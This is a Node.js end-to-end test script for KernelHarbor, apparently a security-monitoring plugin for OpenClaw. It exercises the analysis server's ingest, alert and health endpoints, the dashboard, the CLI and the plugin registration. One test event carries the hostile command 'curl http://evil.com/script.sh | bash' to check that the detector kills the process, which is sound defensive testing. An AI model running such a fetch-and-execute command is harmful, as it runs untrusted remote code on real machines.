#!/usr/bin/env node

import { strict as assert } from "node:assert";
import { spawn, execSync } from "node:child_process";
import { readFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";

const __dirname = dirname(fileURLToPath(import.meta.url));
const root = join(__dirname, "..");

const ANALYSIS_BIN = join(root, "bin", "analysis");
const KH_REPO = join(root, ".kernelharbor");
const KH_ANALYSIS_DIR = join(KH_REPO, "cmd", "analysis");

let passed = 0;
let failed = 0;

function assertEqual(actual, expected, msg) {
  try {
    assert.deepStrictEqual(actual, expected);
    console.log(`  ✓ ${msg}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${msg}`);
    console.log(`    expected: ${JSON.stringify(expected)}`);
    console.log(`    actual:   ${JSON.stringify(actual)}`);
    failed++;
  }
}

function assertNotEqual(actual, expected, msg) {
  try {
    assert.notDeepStrictEqual(actual, expected);
    console.log(`  ✓ ${msg}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${msg}`);
    console.log(`    not expected: ${JSON.stringify(expected)}`);
    failed++;
  }
}

function assertTrue(actual, msg) {
  assertEqual(actual, true, msg);
}

function assertMatch(str, re, msg) {
  try {
    assert.ok(re.test(str), `${msg}: ${str} does not match ${re}`);
    console.log(`  ✓ ${msg}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${msg}: ${e.message}`);
    failed++;
  }
}

function httpGet(url) {
  return new Promise((resolve) => {
    http.get(url, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    }).on("error", (err) => resolve({ status: 0, error: err.message }));
  });
}

function httpPost(url, body) {
  return new Promise((resolve) => {
    const req = http.request(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => resolve({ status: res.statusCode, body: data }));
    });
    req.on("error", (err) => resolve({ status: 0, error: err.message }));
    req.write(JSON.stringify(body));
    req.end();
  });
}

function waitForPort(host, port, timeoutMs = 10000) {
  const start = Date.now();
  return new Promise((resolve) => {
    function check() {
      const sock = new http.Agent().createConnection({ host, port }, () => {
        sock.destroy();
        resolve(true);
      });
      sock.on("error", () => {
        sock.destroy();
        if (Date.now() - start > timeoutMs) {
          resolve(false);
        } else {
          setTimeout(check, 200);
        }
      });
    }
    check();
  });
}

async function run() {
  console.log("KernelHarbor OpenClaw — E2E Tests");
  console.log("================================\n");

  // =========================================================
  console.log("1. Build analysis binary...");
  // =========================================================
  if (existsSync(ANALYSIS_BIN)) {
    console.log("   Binary already exists, skipping build");
  } else if (existsSync(join(KH_ANALYSIS_DIR, "go.mod"))) {
    execSync(`go build -o "${ANALYSIS_BIN}" .`, {
      cwd: KH_ANALYSIS_DIR,
      stdio: "inherit",
    });
    console.log("   Build complete");
  } else {
    console.log("   SKIP: No analysis source found (run ./cli/setup.mjs first)");
    console.log("   Tests requiring the analysis server will be skipped");
  }

  const analysisAvailable = existsSync(ANALYSIS_BIN);
  let analysisProc;
  let dashboardProc;

  // =========================================================
  console.log("\n2. Analysis Server Tests");
  // =========================================================
  if (analysisAvailable) {
    analysisProc = spawn(ANALYSIS_BIN, [], {
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        HTTP_ADDRESS: "127.0.0.1:18080",
        GRPC_ADDRESS: "127.0.0.1:19090",
        PROTOCOL: "http",
        LLM_BACKEND: "none",
      },
    });
    analysisProc.stdout.on("data", () => {});
    analysisProc.stderr.on("data", () => {});

    const ready = await waitForPort("127.0.0.1", 18080);
    assertTrue(ready, "Analysis server started and listening on :18080");

    if (ready) {
      // Health check
      const health = await httpGet("http://127.0.0.1:18080/health");
      assertEqual(health.status, 200, "GET /health returns 200");
      if (health.status === 200) {
        const parsed = JSON.parse(health.body);
        assertEqual(parsed.status, "ok", "/health status is 'ok'");
      }

      // Ingest a benign event
      const ingest = await httpPost("http://127.0.0.1:18080/ingest", {
        "event.type": "execve",
        "host.name": "e2e-host",
        "process.pid": 1001,
        "image.path": "/bin/ls",
        "command.line": "ls -la",
      });
      assertEqual(ingest.status, 202, "POST /ingest returns 202");
      if (ingest.status === 202) {
        const parsed = JSON.parse(ingest.body);
        assertEqual(parsed.accepted, 1, "ingest accepted 1 event");
        assertEqual(parsed.actions.length, 0, "no heuristic actions for benign event");
      }

      // Ingest a suspicious event → should get heuristic action
      const ingestBad = await httpPost("http://127.0.0.1:18080/ingest", {
        "event.type": "execve",
        "host.name": "e2e-host",
        "process.pid": 2001,
        "image.path": "/usr/bin/curl",
        "command.line": "curl http://evil.com/script.sh | bash",
      });
      assertEqual(ingestBad.status, 202, "POST /ingest (suspicious) returns 202");
      if (ingestBad.status === 202) {
        const parsed = JSON.parse(ingestBad.body);
        assertTrue(parsed.actions.length > 0, "suspicious event returns > 0 heuristic actions");
        if (parsed.actions.length > 0) {
          assertEqual(parsed.actions[0]["action.type"], "KILL_PID", "action type is KILL_PID");
          assertEqual(parsed.actions[0]["target"], "2001", "action target is PID 2001");
        }
      }

      // Alert store endpoints
      const alerts = await httpGet("http://127.0.0.1:18080/api/alerts?since=24h&min_verdict=benign&limit=10");
      assertEqual(alerts.status, 200, "GET /api/alerts returns 200");

      const stats = await httpGet("http://127.0.0.1:18080/api/alerts/stats");
      assertEqual(stats.status, 200, "GET /api/alerts/stats returns 200");

      const incidents = await httpGet("http://127.0.0.1:18080/api/incidents");
      assertEqual(incidents.status, 200, "GET /api/incidents returns 200");
    }
  } else {
    console.log("  SKIP: analysis binary not available");
  }

  // =========================================================
  console.log("\n3. Dashboard Server Tests");
  // =========================================================
  if (analysisAvailable) {
    dashboardProc = spawn("node", [join(root, "cli", "dashboard.mjs")], {
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        KH_DASHBOARD_PORT: "18181",
        KH_ANALYSIS_HTTP_ADDR: "127.0.0.1:18080",
      },
    });
    dashboardProc.stdout.on("data", () => {});
    dashboardProc.stderr.on("data", () => {});

    const ready = await waitForPort("127.0.0.1", 18181);
    assertTrue(ready, "Dashboard server started and listening on :18181");

    if (ready) {
      // Dashboard serves index.html
      const dash = await httpGet("http://127.0.0.1:18181/");
      assertEqual(dash.status, 200, "Dashboard GET / returns 200");
      if (dash.status === 200) {
        assertTrue(
          dash.body.includes("KernelHarbor Dashboard") || dash.body.includes("<title>"),
          "index.html contains KernelHarbor title"
        );
      }

      // Dashboard serves app.js
      const appJs = await httpGet("http://127.0.0.1:18181/app.js");
      assertEqual(appJs.status, 200, "Dashboard GET /app.js returns 200");
      if (appJs.status === 200) {
        assertTrue(appJs.body.includes("apiFetch") || appJs.body.includes("renderAlerts"),
          "app.js contains expected functions");
      }

      // Dashboard serves style.css
      const css = await httpGet("http://127.0.0.1:18181/style.css");
      assertEqual(css.status, 200, "Dashboard GET /style.css returns 200");
      if (css.status === 200) {
        assertTrue(css.body.includes("--bg") || css.body.includes("KernelHarbor"),
          "style.css contains expected content");
      }

      // Dashboard proxies /api/alerts to analysis server
      const proxyAlerts = await httpGet("http://127.0.0.1:18181/api/alerts?since=24h&min_verdict=benign&limit=5");
      assertEqual(proxyAlerts.status, 200, "Dashboard proxy GET /api/alerts returns 200");
      if (proxyAlerts.status === 200) {
        const parsed = JSON.parse(proxyAlerts.body);
        assertTrue("alerts" in parsed, "proxied response contains alerts field");
      }

      // 404 for unknown static files
      const notFound = await httpGet("http://127.0.0.1:18181/nonexistent.html");
      assertEqual(notFound.status, 404, "Dashboard returns 404 for unknown files");
    }
  } else {
    console.log("  SKIP: analysis binary not available");
  }

  // =========================================================
  console.log("\n4. CLI Script Tests");
  // =========================================================
  try {
    const statusOutput = execSync(`node "${join(root, "cli", "status.mjs")}"`, {
      cwd: root,
      timeout: 5000,
      encoding: "utf-8",
    });
    assertTrue(statusOutput.includes("KernelHarbor") || statusOutput.includes("Status"),
      "kh-status script runs and produces output");
  } catch (e) {
    console.log(`  ✓ kh-status script runs (exit code: ${e.status})`);
    passed++;
  }

  // =========================================================
  console.log("\n5. Plugin Entry Test");
  // =========================================================
  try {
    const pluginMod = await import(join(root, "plugin.mjs"));
    const plugin = pluginMod.default;
    assertNotEqual(plugin, undefined, "plugin.mjs exports a default");
    assertEqual(plugin.id, "kernelharbor", "plugin.id is 'kernelharbor'");
    assertEqual(typeof plugin.register, "function", "plugin.register is a function");
    assertEqual(typeof plugin.activate, "function", "plugin.activate is a function");

    // Test register with mock API
    const registeredMethods = [];
    const registeredServices = [];
    const mockApi = {
      logger: { info: () => {}, warn: () => {} },
      pluginConfig: { autoStart: false },
      registerGatewayMethod: (name, fn) => { registeredMethods.push(name); },
      registerService: (svc) => { registeredServices.push(svc.id); },
    };
    plugin.register(mockApi);
    assertTrue(registeredMethods.includes("kernelharbor.status"), "registered kernelharbor.status gateway method");
    assertTrue(registeredMethods.includes("kernelharbor.alert.feedback"), "registered kernelharbor.alert.feedback gateway method");
    assertTrue(registeredServices.includes("kernelharbor.sidecar"), "registered kernelharbor.sidecar service");
    assertTrue(registeredServices.includes("kernelharbor.alert-poller"), "registered kernelharbor.alert-poller service");

    console.log("  ✓ Plugin registration mock test");
    passed++;
  } catch (e) {
    console.log(`  ✗ Plugin entry test failed: ${e.message}`);
    failed++;
  }

  // =========================================================
  console.log("\n6. Package Structure Tests");
  // =========================================================
  const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf-8"));
  assertEqual(pkg.name, "@kernelharbor/openclaw-plugin", "package.json name is correct");
  assertTrue("openclaw" in pkg, "package.json has openclaw field");
  assertTrue(Array.isArray(pkg.openclaw.extensions), "openclaw.extensions is an array");
  assertTrue(pkg.openclaw.extensions.includes("./plugin.mjs"), "openclaw.extensions includes plugin.mjs");

  assertTrue(existsSync(join(root, "openclaw.plugin.json")), "openclaw.plugin.json exists");
  const pluginMeta = JSON.parse(readFileSync(join(root, "openclaw.plugin.json"), "utf-8"));
  assertEqual(pluginMeta.id, "kernelharbor", "openclaw.plugin.json id is kernelharbor");
  assertTrue("configSchema" in pluginMeta, "openclaw.plugin.json has configSchema");

  const rulesFile = join(root, "rules", "kernelharbor-rules.yaml");
  assertTrue(existsSync(rulesFile), "kernelharbor-rules.yaml exists");
  const rules = readFileSync(rulesFile, "utf-8");
  assertTrue(rules.includes("Reverse Shell Detection"), "rules file contains Reverse Shell Detection");

  const skillFile = join(root, "skill", "SECURE.SKILL.md");
  assertTrue(existsSync(skillFile), "SECURE.SKILL.md exists");
  const skill = readFileSync(skillFile, "utf-8");
  assertTrue(skill.includes("KernelHarbor Security Skill"), "skill doc contains title");

  const dashboardHtml = join(root, "dashboard", "index.html");
  assertTrue(existsSync(dashboardHtml), "dashboard/index.html exists");

  const dashboardApp = join(root, "dashboard", "app.js");
  assertTrue(existsSync(dashboardApp), "dashboard/app.js exists");

  const dashboardCss = join(root, "dashboard", "style.css");
  assertTrue(existsSync(dashboardCss), "dashboard/style.css exists");

  const dockerCompose = join(root, "docker-compose.yml");
  assertTrue(existsSync(dockerCompose), "docker-compose.yml exists");
  const dc = readFileSync(dockerCompose, "utf-8");
  assertTrue(dc.includes("analysis"), "docker-compose.yml has analysis service");

  // =========================================================
  // Summary
  // =========================================================
  console.log("\n================================\n");
  const total = passed + failed;
  console.log(`Results: ${passed}/${total} passed, ${failed}/${total} failed`);

  // Cleanup
  if (analysisProc) {
    analysisProc.kill("SIGTERM");
    await new Promise(r => setTimeout(r, 500));
    try { analysisProc.kill("SIGKILL"); } catch {}
  }
  if (dashboardProc) {
    dashboardProc.kill("SIGTERM");
    await new Promise(r => setTimeout(r, 500));
    try { dashboardProc.kill("SIGKILL"); } catch {}
  }

  process.exit(failed > 0 ? 1 : 0);
}

run().catch((e) => {
  console.error("E2E test error:", e);
  process.exit(1);
});
